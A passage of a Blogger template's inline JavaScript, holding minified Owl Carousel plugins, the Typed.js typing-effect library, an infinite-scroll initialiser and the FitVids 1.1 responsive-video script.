a=a.originalEvent||a||b.event,a=a.touches&&a.touches.length?a.touches[0]:a.changedTouches&&a.changedTouches.length?a.changedTouches[0]:a,a.pageX?(c.x=a.pageX,c.y=a.pageY):(c.x=a.clientX,c.y=a.clientY),c},e.prototype.isNumeric=function(a){return!isNaN(parseFloat(a))},e.prototype.difference=function(a,b){return{x:a.x-b.x,y:a.y-b.y}},a.fn.owlCarousel=function(b){var c=Array.prototype.slice.call(arguments,1);return this.each(function(){var d=a(this),f=d.data("owl.carousel");f||(f=new e(this,"object"==typeof b&&b),d.data("owl.carousel",f),a.each(["next","prev","to","destroy","refresh","replace","add","remove"],function(b,c){f.register({type:e.Type.Event,name:c}),f.$element.on(c+".owl.carousel.core",a.proxy(function(a){a.namespace&&a.relatedTarget!==this&&(this.suppress([c]),f[c].apply(this,[].slice.call(arguments,1)),this.release([c]))},f))})),"string"==typeof b&&"_"!==b.charAt(0)&&f[b].apply(f,c)})},a.fn.owlCarousel.Constructor=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){var e=function(b){this._core=b,this._interval=null,this._visible=null,this._handlers={"initialized.owl.carousel":a.proxy(function(a){a.namespace&&this._core.settings.autoRefresh&&this.watch()},this)},this._core.options=a.extend({},e.Defaults,this._core.options),this._core.$element.on(this._handlers)};e.Defaults={autoRefresh:!0,autoRefreshInterval:500},e.prototype.watch=function(){this._interval||(this._visible=this._core.$element.is(":visible"),this._interval=b.setInterval(a.proxy(this.refresh,this),this._core.settings.autoRefreshInterval))},e.prototype.refresh=function(){this._core.$element.is(":visible")!==this._visible&&(this._visible=!this._visible,this._core.$element.toggleClass("owl-hidden",!this._visible),this._visible&&this._core.invalidate("width")&&this._core.refresh())},e.prototype.destroy=function(){var a,c;b.clearInterval(this._interval);for(a in this._handlers)this._core.$element.off(a,this._handlers[a]);for(c in Object.getOwnPropertyNames(this))"function"!=typeof this[c]&&(this[c]=null)},a.fn.owlCarousel.Constructor.Plugins.AutoRefresh=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){var e=function(b){this._core=b,this._loaded=[],this._handlers={"initialized.owl.carousel change.owl.carousel resized.owl.carousel":a.proxy(function(b){if(b.namespace&&this._core.settings&&this._core.settings.lazyLoad&&(b.property&&"position"==b.property.name||"initialized"==b.type))for(var c=this._core.settings,e=c.center&&Math.ceil(c.items/2)||c.items,f=c.center&&-1*e||0,g=(b.property&&b.property.value!==d?b.property.value:this._core.current())+f,h=this._core.clones().length,i=a.proxy(function(a,b){this.load(b)},this);f++<e;)this.load(h/2+this._core.relative(g)),h&&a.each(this._core.clones(this._core.relative(g)),i),g++},this)},this._core.options=a.extend({},e.Defaults,this._core.options),this._core.$element.on(this._handlers)};e.Defaults={lazyLoad:!1},e.prototype.load=function(c){var d=this._core.$stage.children().eq(c),e=d&&d.find(".owl-lazy");!e||a.inArray(d.get(0),this._loaded)>-1||(e.each(a.proxy(function(c,d){var e,f=a(d),g=b.devicePixelRatio>1&&f.attr("data-src-retina")||f.attr("data-src");this._core.trigger("load",{element:f,url:g},"lazy"),f.is("img")?f.one("load.owl.lazy",a.proxy(function(){f.css("opacity",1),this._core.trigger("loaded",{element:f,url:g},"lazy")},this)).attr("src",g):(e=new Image,e.onload=a.proxy(function(){f.css({"background-image":"url("+g+")",opacity:"1"}),this._core.trigger("loaded",{element:f,url:g},"lazy")},this),e.src=g)},this)),this._loaded.push(d.get(0)))},e.prototype.destroy=function(){var a,b;for(a in this.handlers)this._core.$element.off(a,this.handlers[a]);for(b in Object.getOwnPropertyNames(this))"function"!=typeof this[b]&&(this[b]=null)},a.fn.owlCarousel.Constructor.Plugins.Lazy=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){var e=function(b){this._core=b,this._handlers={"initialized.owl.carousel refreshed.owl.carousel":a.proxy(function(a){a.namespace&&this._core.settings.autoHeight&&this.update()},this),"changed.owl.carousel":a.proxy(function(a){a.namespace&&this._core.settings.autoHeight&&"position"==a.property.name&&this.update()},this),"loaded.owl.lazy":a.proxy(function(a){a.namespace&&this._core.settings.autoHeight&&a.element.closest("."+this._core.settings.itemClass).index()===this._core.current()&&this.update()},this)},this._core.options=a.extend({},e.Defaults,this._core.options),this._core.$element.on(this._handlers)};e.Defaults={autoHeight:!1,autoHeightClass:"owl-height"},e.prototype.update=function(){var b=this._core._current,c=b+this._core.settings.items,d=this._core.$stage.children().toArray().slice(b,c),e=[],f=0;a.each(d,function(b,c){e.push(a(c).height())}),f=Math.max.apply(null,e),this._core.$stage.parent().height(f).addClass(this._core.settings.autoHeightClass)},e.prototype.destroy=function(){var a,b;for(a in this._handlers)this._core.$element.off(a,this._handlers[a]);for(b in Object.getOwnPropertyNames(this))"function"!=typeof this[b]&&(this[b]=null)},a.fn.owlCarousel.Constructor.Plugins.AutoHeight=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){var e=function(b){this._core=b,this._videos={},this._playing=null,this._handlers={"initialized.owl.carousel":a.proxy(function(a){a.namespace&&this._core.register({type:"state",name:"playing",tags:["interacting"]})},this),"resize.owl.carousel":a.proxy(function(a){a.namespace&&this._core.settings.video&&this.isInFullScreen()&&a.preventDefault()},this),"refreshed.owl.carousel":a.proxy(function(a){a.namespace&&this._core.is("resizing")&&this._core.$stage.find(".cloned .owl-video-frame").remove()},this),"changed.owl.carousel":a.proxy(function(a){a.namespace&&"position"===a.property.name&&this._playing&&this.stop()},this),"prepared.owl.carousel":a.proxy(function(b){if(b.namespace){var c=a(b.content).find(".owl-video");c.length&&(c.css("display","none"),this.fetch(c,a(b.content)))}},this)},this._core.options=a.extend({},e.Defaults,this._core.options),this._core.$element.on(this._handlers),this._core.$element.on("click.owl.video",".owl-video-play-icon",a.proxy(function(a){this.play(a)},this))};e.Defaults={video:!1,videoHeight:!1,videoWidth:!1},e.prototype.fetch=function(a,b){var c=function(){return a.attr("data-vimeo-id")?"vimeo":a.attr("data-vzaar-id")?"vzaar":"youtube"}(),d=a.attr("data-vimeo-id")||a.attr("data-youtube-id")||a.attr("data-vzaar-id"),e=a.attr("data-width")||this._core.settings.videoWidth,f=a.attr("data-height")||this._core.settings.videoHeight,g=a.attr("href");if(!g)throw new Error("Missing video URL.");if(d=g.match(/(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/),d[3].indexOf("youtu")>-1)c="youtube";else if(d[3].indexOf("vimeo")>-1)c="vimeo";else{if(!(d[3].indexOf("vzaar")>-1))throw new Error("Video URL not supported.");c="vzaar"}d=d[6],this._videos[g]={type:c,id:d,width:e,height:f},b.attr("data-video",g),this.thumbnail(a,this._videos[g])},e.prototype.thumbnail=function(b,c){var d,e,f,g=c.width&&c.height?'style="width:'+c.width+"px;height:"+c.height+'px;"':"",h=b.find("img"),i="src",j="",k=this._core.settings,l=function(a){e='<div class="owl-video-play-icon"></div>',d=k.lazyLoad?'<div class="owl-video-tn '+j+'" '+i+'="'+a+'"></div>':'<div class="owl-video-tn" style="opacity:1;background-image:url('+a+')"></div>',b.after(d),b.after(e)};return b.wrap('<div class="owl-video-wrapper"'+g+"></div>"),this._core.settings.lazyLoad&&(i="data-src",j="owl-lazy"),h.length?(l(h.attr(i)),h.remove(),!1):void("youtube"===c.type?(f="//img.youtube.com/vi/"+c.id+"/hqdefault.jpg",l(f)):"vimeo"===c.type?a.ajax({type:"GET",url:"//vimeo.com/api/v2/video/"+c.id+".json",jsonp:"callback",dataType:"jsonp",success:function(a){f=a[0].thumbnail_large,l(f)}}):"vzaar"===c.type&&a.ajax({type:"GET",url:"//vzaar.com/api/videos/"+c.id+".json",jsonp:"callback",dataType:"jsonp",success:function(a){f=a.framegrab_url,l(f)}}))},e.prototype.stop=function(){this._core.trigger("stop",null,"video"),this._playing.find(".owl-video-frame").remove(),this._playing.removeClass("owl-video-playing"),this._playing=null,this._core.leave("playing"),this._core.trigger("stopped",null,"video")},e.prototype.play=function(b){var c,d=a(b.target),e=d.closest("."+this._core.settings.itemClass),f=this._videos[e.attr("data-video")],g=f.width||"100%",h=f.height||this._core.$stage.height();this._playing||(this._core.enter("playing"),this._core.trigger("play",null,"video"),e=this._core.items(this._core.relative(e.index())),this._core.reset(e.index()),"youtube"===f.type?c='<iframe width="'+g+'" height="'+h+'" src="//www.youtube.com/embed/'+f.id+"?autoplay=1&v="+f.id+'" frameborder="0" allowfullscreen></iframe>':"vimeo"===f.type?c='<iframe src="//player.vimeo.com/video/'+f.id+'?autoplay=1" width="'+g+'" height="'+h+'" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>':"vzaar"===f.type&&(c='<iframe frameborder="0"height="'+h+'"width="'+g+'" allowfullscreen mozallowfullscreen webkitAllowFullScreen src="//view.vzaar.com/'+f.id+'/player?autoplay=true"></iframe>'),a('<div class="owl-video-frame">'+c+"</div>").insertAfter(e.find(".owl-video")),this._playing=e.addClass("owl-video-playing"))},e.prototype.isInFullScreen=function(){var b=c.fullscreenElement||c.mozFullScreenElement||c.webkitFullscreenElement;return b&&a(b).parent().hasClass("owl-video-frame")},e.prototype.destroy=function(){var a,b;this._core.$element.off("click.owl.video");for(a in this._handlers)this._core.$element.off(a,this._handlers[a]);for(b in Object.getOwnPropertyNames(this))"function"!=typeof this[b]&&(this[b]=null)},a.fn.owlCarousel.Constructor.Plugins.Video=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){var e=function(b){this.core=b,this.core.options=a.extend({},e.Defaults,this.core.options),this.swapping=!0,this.previous=d,this.next=d,this.handlers={"change.owl.carousel":a.proxy(function(a){a.namespace&&"position"==a.property.name&&(this.previous=this.core.current(),this.next=a.property.value)},this),"drag.owl.carousel dragged.owl.carousel translated.owl.carousel":a.proxy(function(a){a.namespace&&(this.swapping="translated"==a.type)},this),"translate.owl.carousel":a.proxy(function(a){a.namespace&&this.swapping&&(this.core.options.animateOut||this.core.options.animateIn)&&this.swap()},this)},this.core.$element.on(this.handlers)};e.Defaults={animateOut:!1,animateIn:!1},e.prototype.swap=function(){if(1===this.core.settings.items&&a.support.animation&&a.support.transition){this.core.speed(0);var b,c=a.proxy(this.clear,this),d=this.core.$stage.children().eq(this.previous),e=this.core.$stage.children().eq(this.next),f=this.core.settings.animateIn,g=this.core.settings.animateOut;this.core.current()!==this.previous&&(g&&(b=this.core.coordinates(this.previous)-this.core.coordinates(this.next),d.one(a.support.animation.end,c).css({left:b+"px"}).addClass("animated owl-animated-out").addClass(g)),f&&e.one(a.support.animation.end,c).addClass("animated owl-animated-in").addClass(f))}},e.prototype.clear=function(b){a(b.target).css({left:""}).removeClass("animated owl-animated-out owl-animated-in").removeClass(this.core.settings.animateIn).removeClass(this.core.settings.animateOut),this.core.onTransitionEnd()},e.prototype.destroy=function(){var a,b;for(a in this.handlers)this.core.$element.off(a,this.handlers[a]);for(b in Object.getOwnPropertyNames(this))"function"!=typeof this[b]&&(this[b]=null);
},a.fn.owlCarousel.Constructor.Plugins.Animate=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){var e=function(b){this._core=b,this._timeout=null,this._paused=!1,this._handlers={"changed.owl.carousel":a.proxy(function(a){a.namespace&&"settings"===a.property.name?this._core.settings.autoplay?this.play():this.stop():a.namespace&&"position"===a.property.name&&this._core.settings.autoplay&&this._setAutoPlayInterval()},this),"initialized.owl.carousel":a.proxy(function(a){a.namespace&&this._core.settings.autoplay&&this.play()},this),"play.owl.autoplay":a.proxy(function(a,b,c){a.namespace&&this.play(b,c)},this),"stop.owl.autoplay":a.proxy(function(a){a.namespace&&this.stop()},this),"mouseover.owl.autoplay":a.proxy(function(){this._core.settings.autoplayHoverPause&&this._core.is("rotating")&&this.pause()},this),"mouseleave.owl.autoplay":a.proxy(function(){this._core.settings.autoplayHoverPause&&this._core.is("rotating")&&this.play()},this),"touchstart.owl.core":a.proxy(function(){this._core.settings.autoplayHoverPause&&this._core.is("rotating")&&this.pause()},this),"touchend.owl.core":a.proxy(function(){this._core.settings.autoplayHoverPause&&this.play()},this)},this._core.$element.on(this._handlers),this._core.options=a.extend({},e.Defaults,this._core.options)};e.Defaults={autoplay:!1,autoplayTimeout:5e3,autoplayHoverPause:!1,autoplaySpeed:!1},e.prototype.play=function(a,b){this._paused=!1,this._core.is("rotating")||(this._core.enter("rotating"),this._setAutoPlayInterval())},e.prototype._getNextTimeout=function(d,e){return this._timeout&&b.clearTimeout(this._timeout),b.setTimeout(a.proxy(function(){this._paused||this._core.is("busy")||this._core.is("interacting")||c.hidden||this._core.next(e||this._core.settings.autoplaySpeed)},this),d||this._core.settings.autoplayTimeout)},e.prototype._setAutoPlayInterval=function(){this._timeout=this._getNextTimeout()},e.prototype.stop=function(){this._core.is("rotating")&&(b.clearTimeout(this._timeout),this._core.leave("rotating"))},e.prototype.pause=function(){this._core.is("rotating")&&(this._paused=!0)},e.prototype.destroy=function(){var a,b;this.stop();for(a in this._handlers)this._core.$element.off(a,this._handlers[a]);for(b in Object.getOwnPropertyNames(this))"function"!=typeof this[b]&&(this[b]=null)},a.fn.owlCarousel.Constructor.Plugins.autoplay=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){"use strict";var e=function(b){this._core=b,this._initialized=!1,this._pages=[],this._controls={},this._templates=[],this.$element=this._core.$element,this._overrides={next:this._core.next,prev:this._core.prev,to:this._core.to},this._handlers={"prepared.owl.carousel":a.proxy(function(b){b.namespace&&this._core.settings.dotsData&&this._templates.push('<div class="'+this._core.settings.dotClass+'">'+a(b.content).find("[data-dot]").addBack("[data-dot]").attr("data-dot")+"</div>")},this),"added.owl.carousel":a.proxy(function(a){a.namespace&&this._core.settings.dotsData&&this._templates.splice(a.position,0,this._templates.pop())},this),"remove.owl.carousel":a.proxy(function(a){a.namespace&&this._core.settings.dotsData&&this._templates.splice(a.position,1)},this),"changed.owl.carousel":a.proxy(function(a){a.namespace&&"position"==a.property.name&&this.draw()},this),"initialized.owl.carousel":a.proxy(function(a){a.namespace&&!this._initialized&&(this._core.trigger("initialize",null,"navigation"),this.initialize(),this.update(),this.draw(),this._initialized=!0,this._core.trigger("initialized",null,"navigation"))},this),"refreshed.owl.carousel":a.proxy(function(a){a.namespace&&this._initialized&&(this._core.trigger("refresh",null,"navigation"),this.update(),this.draw(),this._core.trigger("refreshed",null,"navigation"))},this)},this._core.options=a.extend({},e.Defaults,this._core.options),this.$element.on(this._handlers)};e.Defaults={nav:!1,navText:["prev","next"],navSpeed:!1,navElement:"div",navContainer:!1,navContainerClass:"owl-nav",navClass:["owl-prev","owl-next"],slideBy:1,dotClass:"owl-dot",dotsClass:"owl-dots",dots:!0,dotsEach:!1,dotsData:!1,dotsSpeed:!1,dotsContainer:!1},e.prototype.initialize=function(){var b,c=this._core.settings;this._controls.$relative=(c.navContainer?a(c.navContainer):a("<div>").addClass(c.navContainerClass).appendTo(this.$element)).addClass("disabled"),this._controls.$previous=a("<"+c.navElement+">").addClass(c.navClass[0]).html(c.navText[0]).prependTo(this._controls.$relative).on("click",a.proxy(function(a){this.prev(c.navSpeed)},this)),this._controls.$next=a("<"+c.navElement+">").addClass(c.navClass[1]).html(c.navText[1]).appendTo(this._controls.$relative).on("click",a.proxy(function(a){this.next(c.navSpeed)},this)),c.dotsData||(this._templates=[a("<div>").addClass(c.dotClass).append(a("<span>")).prop("outerHTML")]),this._controls.$absolute=(c.dotsContainer?a(c.dotsContainer):a("<div>").addClass(c.dotsClass).appendTo(this.$element)).addClass("disabled"),this._controls.$absolute.on("click","div",a.proxy(function(b){var d=a(b.target).parent().is(this._controls.$absolute)?a(b.target).index():a(b.target).parent().index();b.preventDefault(),this.to(d,c.dotsSpeed)},this));for(b in this._overrides)this._core[b]=a.proxy(this[b],this)},e.prototype.destroy=function(){var a,b,c,d;for(a in this._handlers)this.$element.off(a,this._handlers[a]);for(b in this._controls)this._controls[b].remove();for(d in this.overides)this._core[d]=this._overrides[d];for(c in Object.getOwnPropertyNames(this))"function"!=typeof this[c]&&(this[c]=null)},e.prototype.update=function(){var a,b,c,d=this._core.clones().length/2,e=d+this._core.items().length,f=this._core.maximum(!0),g=this._core.settings,h=g.center||g.autoWidth||g.dotsData?1:g.dotsEach||g.items;if("page"!==g.slideBy&&(g.slideBy=Math.min(g.slideBy,g.items)),g.dots||"page"==g.slideBy)for(this._pages=[],a=d,b=0,c=0;e>a;a++){if(b>=h||0===b){if(this._pages.push({start:Math.min(f,a-d),end:a-d+h-1}),Math.min(f,a-d)===f)break;b=0,++c}b+=this._core.mergers(this._core.relative(a))}},e.prototype.draw=function(){var b,c=this._core.settings,d=this._core.items().length<=c.items,e=this._core.relative(this._core.current()),f=c.loop||c.rewind;this._controls.$relative.toggleClass("disabled",!c.nav||d),c.nav&&(this._controls.$previous.toggleClass("disabled",!f&&e<=this._core.minimum(!0)),this._controls.$next.toggleClass("disabled",!f&&e>=this._core.maximum(!0))),this._controls.$absolute.toggleClass("disabled",!c.dots||d),c.dots&&(b=this._pages.length-this._controls.$absolute.children().length,c.dotsData&&0!==b?this._controls.$absolute.html(this._templates.join("")):b>0?this._controls.$absolute.append(new Array(b+1).join(this._templates[0])):0>b&&this._controls.$absolute.children().slice(b).remove(),this._controls.$absolute.find(".active").removeClass("active"),this._controls.$absolute.children().eq(a.inArray(this.current(),this._pages)).addClass("active"))},e.prototype.onTrigger=function(b){var c=this._core.settings;b.page={index:a.inArray(this.current(),this._pages),count:this._pages.length,size:c&&(c.center||c.autoWidth||c.dotsData?1:c.dotsEach||c.items)}},e.prototype.current=function(){var b=this._core.relative(this._core.current());return a.grep(this._pages,a.proxy(function(a,c){return a.start<=b&&a.end>=b},this)).pop()},e.prototype.getPosition=function(b){var c,d,e=this._core.settings;return"page"==e.slideBy?(c=a.inArray(this.current(),this._pages),d=this._pages.length,b?++c:--c,c=this._pages[(c%d+d)%d].start):(c=this._core.relative(this._core.current()),d=this._core.items().length,b?c+=e.slideBy:c-=e.slideBy),c},e.prototype.next=function(b){a.proxy(this._overrides.to,this._core)(this.getPosition(!0),b)},e.prototype.prev=function(b){a.proxy(this._overrides.to,this._core)(this.getPosition(!1),b)},e.prototype.to=function(b,c,d){var e;!d&&this._pages.length?(e=this._pages.length,a.proxy(this._overrides.to,this._core)(this._pages[(b%e+e)%e].start,c)):a.proxy(this._overrides.to,this._core)(b,c)},a.fn.owlCarousel.Constructor.Plugins.Navigation=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){"use strict";var e=function(c){this._core=c,this._hashes={},this.$element=this._core.$element,this._handlers={"initialized.owl.carousel":a.proxy(function(c){c.namespace&&"URLHash"===this._core.settings.startPosition&&a(b).trigger("hashchange.owl.navigation")},this),"prepared.owl.carousel":a.proxy(function(b){if(b.namespace){var c=a(b.content).find("[data-hash]").addBack("[data-hash]").attr("data-hash");if(!c)return;this._hashes[c]=b.content}},this),"changed.owl.carousel":a.proxy(function(c){if(c.namespace&&"position"===c.property.name){var d=this._core.items(this._core.relative(this._core.current())),e=a.map(this._hashes,function(a,b){return a===d?b:null}).join();if(!e||b.location.hash.slice(1)===e)return;b.location.hash=e}},this)},this._core.options=a.extend({},e.Defaults,this._core.options),this.$element.on(this._handlers),a(b).on("hashchange.owl.navigation",a.proxy(function(a){var c=b.location.hash.substring(1),e=this._core.$stage.children(),f=this._hashes[c]&&e.index(this._hashes[c]);f!==d&&f!==this._core.current()&&this._core.to(this._core.relative(f),!1,!0)},this))};e.Defaults={URLhashListener:!1},e.prototype.destroy=function(){var c,d;a(b).off("hashchange.owl.navigation");for(c in this._handlers)this._core.$element.off(c,this._handlers[c]);for(d in Object.getOwnPropertyNames(this))"function"!=typeof this[d]&&(this[d]=null)},a.fn.owlCarousel.Constructor.Plugins.Hash=e}(window.Zepto||window.jQuery,window,document),function(a,b,c,d){function e(b,c){var e=!1,f=b.charAt(0).toUpperCase()+b.slice(1);return a.each((b+" "+h.join(f+" ")+f).split(" "),function(a,b){return g[b]!==d?(e=c?b:!0,!1):void 0}),e}function f(a){return e(a,!0)}var g=a("<support>").get(0).style,h="Webkit Moz O ms".split(" "),i={transition:{end:{WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"oTransitionEnd",transition:"transitionend"}},animation:{end:{WebkitAnimation:"webkitAnimationEnd",MozAnimation:"animationend",OAnimation:"oAnimationEnd",animation:"animationend"}}},j={csstransforms:function(){return!!e("transform")},csstransforms3d:function(){return!!e("perspective")},csstransitions:function(){return!!e("transition")},cssanimations:function(){return!!e("animation")}};j.csstransitions()&&(a.support.transition=new String(f("transition")),a.support.transition.end=i.transition.end[a.support.transition]),j.cssanimations()&&(a.support.animation=new String(f("animation")),a.support.animation.end=i.animation.end[a.support.animation]),j.csstransforms()&&(a.support.transform=new String(f("transform")),a.support.transform3d=j.csstransforms3d())}(window.Zepto||window.jQuery,window,document);

!function($){"use strict";var Typed=function(el,options){this.el=$(el);this.options=$.extend({},$.fn.typed.defaults,options);this.isInput=this.el.is("input");this.attr=this.options.attr;this.showCursor=this.isInput?false:this.options.showCursor;this.elContent=this.attr?this.el.attr(this.attr):this.el.text();this.contentType=this.options.contentType;this.typeSpeed=this.options.typeSpeed;this.startDelay=this.options.startDelay;this.backSpeed=this.options.backSpeed;this.backDelay=this.options.backDelay;this.stringsElement=this.options.stringsElement;this.strings=this.options.strings;this.strPos=0;this.arrayPos=0;this.stopNum=0;this.loop=this.options.loop;this.loopCount=this.options.loopCount;this.curLoop=0;this.stop=false;this.cursorChar=this.options.cursorChar;this.shuffle=this.options.shuffle;this.sequence=[];this.build()};Typed.prototype={constructor:Typed,init:function(){var self=this;self.timeout=setTimeout(function(){for(var i=0;i<self.strings.length;++i)self.sequence[i]=i;if(self.shuffle)self.sequence=self.shuffleArray(self.sequence);self.typewrite(self.strings[self.sequence[self.arrayPos]],self.strPos)},self.startDelay)},build:function(){var self=this;if(this.showCursor===true){this.cursor=$('<span class="typed-cursor">'+this.cursorChar+"</span>");this.el.after(this.cursor)}if(this.stringsElement){this.strings=[];this.stringsElement.hide();console.log(this.stringsElement.children());var strings=this.stringsElement.children();$.each(strings,function(key,value){self.strings.push($(value).html())})}this.init()},typewrite:function(curString,curStrPos){if(this.stop===true){return}var humanize=Math.round(Math.random()*(100-30))+this.typeSpeed;var self=this;self.timeout=setTimeout(function(){var charPause=0;var substr=curString.substr(curStrPos);if(substr.charAt(0)==="^"){var skip=1;if(/^\^\d+/.test(substr)){substr=/\d+/.exec(substr)[0];skip+=substr.length;charPause=parseInt(substr)}curString=curString.substring(0,curStrPos)+curString.substring(curStrPos+skip)}if(self.contentType==="html"){var curChar=curString.substr(curStrPos).charAt(0);if(curChar==="<"||curChar==="&"){var tag="";var endTag="";if(curChar==="<"){endTag=">"}else{endTag=";"}while(curString.substr(curStrPos+1).charAt(0)!==endTag){tag+=curString.substr(curStrPos).charAt(0);curStrPos++;if(curStrPos+1>curString.length){break}}curStrPos++;tag+=endTag}}self.timeout=setTimeout(function(){if(curStrPos===curString.length){self.options.onStringTyped(self.arrayPos);if(self.arrayPos===self.strings.length-1){self.options.callback();self.curLoop++;if(self.loop===false||self.curLoop===self.loopCount)return}self.timeout=setTimeout(function(){self.backspace(curString,curStrPos)},self.backDelay)}else{if(curStrPos===0){self.options.preStringTyped(self.arrayPos)}var nextString=curString.substr(0,curStrPos+1);if(self.attr){self.el.attr(self.attr,nextString)}else{if(self.isInput){self.el.val(nextString)}else if(self.contentType==="html"){self.el.html(nextString)}else{self.el.text(nextString)}}curStrPos++;self.typewrite(curString,curStrPos)}},charPause)},humanize)},backspace:function(curString,curStrPos){if(this.stop===true){return}var humanize=Math.round(Math.random()*(100-30))+this.backSpeed;var self=this;self.timeout=setTimeout(function(){if(self.contentType==="html"){if(curString.substr(curStrPos).charAt(0)===">"){var tag="";while(curString.substr(curStrPos-1).charAt(0)!=="<"){tag-=curString.substr(curStrPos).charAt(0);curStrPos--;if(curStrPos<0){break}}curStrPos--;tag+="<"}}var nextString=curString.substr(0,curStrPos);if(self.attr){self.el.attr(self.attr,nextString)}else{if(self.isInput){self.el.val(nextString)}else if(self.contentType==="html"){self.el.html(nextString)}else{self.el.text(nextString)}}if(curStrPos>self.stopNum){curStrPos--;self.backspace(curString,curStrPos)}else if(curStrPos<=self.stopNum){self.arrayPos++;if(self.arrayPos===self.strings.length){self.arrayPos=0;if(self.shuffle)self.sequence=self.shuffleArray(self.sequence);self.init()}else self.typewrite(self.strings[self.sequence[self.arrayPos]],curStrPos)}},humanize)},shuffleArray:function(array){var tmp,current,top=array.length;if(top)while(--top){current=Math.floor(Math.random()*(top+1));tmp=array[current];array[current]=array[top];array[top]=tmp}return array},reset:function(){var self=this;clearInterval(self.timeout);var id=this.el.attr("id");this.el.empty();if(typeof this.cursor!=="undefined"){this.cursor.remove()}this.strPos=0;this.arrayPos=0;this.curLoop=0;this.options.resetCallback()}};$.fn.typed=function(option){return this.each(function(){var $this=$(this),data=$this.data("typed"),options=typeof option=="object"&&option;if(data){data.reset()}$this.data("typed",data=new Typed(this,options));if(typeof option=="string")data[option]()})};$.fn.typed.defaults={strings:["These are the default values...","You know what you should do?","Use your own!","Have a great day!"],stringsElement:null,typeSpeed:0,startDelay:0,backSpeed:0,shuffle:false,backDelay:500,loop:false,loopCount:false,showCursor:true,cursorChar:"|",attr:null,contentType:"html",callback:function(){},preStringTyped:function(){},onStringTyped:function(){},resetCallback:function(){}}}(window.jQuery);


//]]></script>
<b:if cond='data:blog.pageType != &quot;item&quot;'>
    <script class='java' type='text/javascript'>
      //<![CDATA[ 
      $(document).ready(function () {
        jQuery.ias();
      });
      //]]>
    </script>
  </b:if>
<script language='javascript' type='text/javascript'>//<![CDATA[
      /*jshint browser:true */
      /*!
* FitVids 1.1
*
* Copyright 2013, Chris Coyier - http://css-tricks.com + Dave Rupert - http://daverupert.com
* Credit to Thierry Koblentz - http://www.alistapart.com/articles/creating-intrinsic-ratios-for-video/
* Released under the WTFPL license - http://sam.zoy.org/wtfpl/
*
*/

      ;(function( $ ){

        'use strict';

        $.fn.fitVids = function( options ) {
          var settings = {
            customSelector: null,
            ignore: null
          };

          if(!document.getElementById('fit-vids-style')) {
            // appendStyles: https://github.com/toddmotto/fluidvids/blob/master/dist/fluidvids.js
            var head = document.head || document.getElementsByTagName('head')[0];
            var css = '.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}';
            var div = document.createElement("div");
            div.innerHTML = '<p>x</p><style id="fit-vids-style">' + css + '</style>';
            head.appendChild(div.childNodes[1]);
          }

          if ( options ) {
            $.extend( settings, options );
          }

          return this.each(function(){
            var selectors = [
              'iframe[src*="player.vimeo.com"]',
              'iframe[src*="youtube.com"]',
              'iframe[src*="youtube-nocookie.com"]',
              'iframe[src*="dailymotion.com"]',
              'iframe[src*="w.soundcloud.com"]',
              'iframe[src*="kickstarter.com"][src*="video.html"]',
              'object',
              'embed'
            ];

            if (settings.customSelector) {
              selectors.push(settings.customSelector);
            }

            var ignoreList = '.fitvidsignore';

            if(settings.ignore) {
              ignoreList = ignoreList + ', ' + settings.ignore;
            }

            var $allVideos = $(this).find(selectors.join(','));
            $allVideos = $allVideos.not('object object'); // SwfObj conflict patch
            $allVideos = $allVideos.not(ignoreList); // Disable FitVids on this video.

            $allVideos.each(function(){
              var $this = $(this);
              if($this.parents(ignoreList).length > 0) {
                return; // Disable FitVids on this video.
              }
              if (this.tagName.toLowerCase() === 'embed' && $this.parent('object').length || $this.parent('.fluid-width-video-wrapper').length) { return; }
              if ((!$this.css('height') && !$this.css('width')) && (isNaN($this.attr('height')) || isNaN($this.attr('width'))))
              {
                $this.attr('height', 9);
                $this.attr('width', 16);
              }
              var height = ( this.tagName.toLowerCase() === 'object' || ($this.attr('height') && !isNaN(parseInt($this.attr('height'), 10))) ) ? parseInt($this.attr('height'), 10) : $this.height(),
                  width = !isNaN(parseInt($this.attr('width'), 10)) ? parseInt($this.attr('width'), 10) : $this.width(),
                  aspectRatio = height / width;
              if(!$this.attr('name')){
                var videoName = 'fitvid' + $.fn.fitVids._count;
                $this.attr('name', videoName);
                $.fn.fitVids._count++;
              }
              $this.wrap('<div class="fluid-width-video-wrapper"></div>').parent('.fluid-width-video-wrapper').css('padding-top', (aspectRatio * 100)+'%');
              $this.removeAttr('height').removeAttr('width');
            });
          });
        };

        // Internal counter for unique video names.
        $.fn.fitVids._count = 0;

        // Works with either jQuery or Zepto
      })( window.jQuery || window.Zepto );
      //]]></script>
<script language='javascript' type='text/javascript'>
      $(document).ready(function(){
        // Target your .container, .wrapper, .post, etc.
        $(&quot;body&quot;).fitVids();
      });
    </script>
<script language='javascript' type='text/javascript'>//<![CDATA[
